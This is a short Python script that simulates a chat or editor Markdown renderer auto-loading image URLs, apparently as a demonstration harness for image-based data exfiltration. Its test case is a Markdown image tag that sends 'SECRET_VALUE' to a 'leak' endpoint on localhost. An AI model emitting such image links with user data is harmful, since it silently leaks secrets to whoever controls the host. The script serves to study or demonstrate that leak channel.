import re
import requests

def render_markdown(markdown_text):
    """
    Simulates a frontend Markdown renderer (like in VS Code, Jupyter, or a Web Chat).
    It parses the markdown for image tags and automatically fetches the URLs.
    """
    print(f"\n[Frontend Renderer] Rendering Markdown output...")
    print(f"[Frontend Renderer] Content Preview:\n---\n{markdown_text}\n---")

    # Regex to find Markdown images: ![alt](url)
    image_pattern = re.compile(r'!\[.*?\]\((.*?)\)')
    
    matches = image_pattern.findall(markdown_text)
    
    if not matches:
        print("[Frontend Renderer] No images found to render.")
        return

    for url in matches:
        print(f"[Frontend Renderer] Found image tag. Auto-loading resource: {url}")
        try:
            # Simulate the browser fetching the image
            # We add a timeout so we don't hang if the server isn't up
            response = requests.get(url, timeout=2)
            print(f"[Frontend Renderer] Request sent. Status Code: {response.status_code}")
        except Exception as e:
            print(f"[Frontend Renderer] Failed to load image: {e}")

if __name__ == "__main__":
    # Test case
    sample_text = "Here is the data: ![leak](http://localhost:8000/leak?data=SECRET_VALUE)"
    render_markdown(sample_text)
